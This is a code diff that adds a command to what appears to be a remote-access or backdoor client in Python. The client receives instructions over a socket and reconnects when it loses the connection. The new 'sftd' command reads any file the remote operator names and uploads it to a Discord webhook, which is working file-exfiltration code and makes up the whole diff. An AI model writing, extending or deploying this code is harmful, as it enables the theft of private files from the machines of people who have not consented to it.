@@ -230,6 +230,30 @@ while True:
             end = end.encode()
             s.send(end)
             
+        if incoming_message[0] == "sftd":
+            end = str(['sftd', "Unknown error occured."])
+            
+            path = incoming_message[1] + "/" + incoming_message[2]
+            
+            if os.path.isfile(path):
+                if os.path.getsize(path) < 7000000:
+                    webhook = discord_webhook.DiscordWebhook(WEBHOOK_URL)
+                    
+                    with open(path, "rb") as f:
+                        webhook.add_file(file=f.read(), filename=incoming_message[2])
+                        
+                    response = webhook.execute()
+                    
+                    if response:
+                        end = str(['sftd', str(response)])
+                else:
+                    end = str(['sftd', "File size must be less than 7 MB."])
+            else:
+                end = str(['sftd', "Invalid path provided."])
+                          
+            end = end.encode()
+            s.send(end)
+            
     except:
         try:
             s.connect((ip, port))
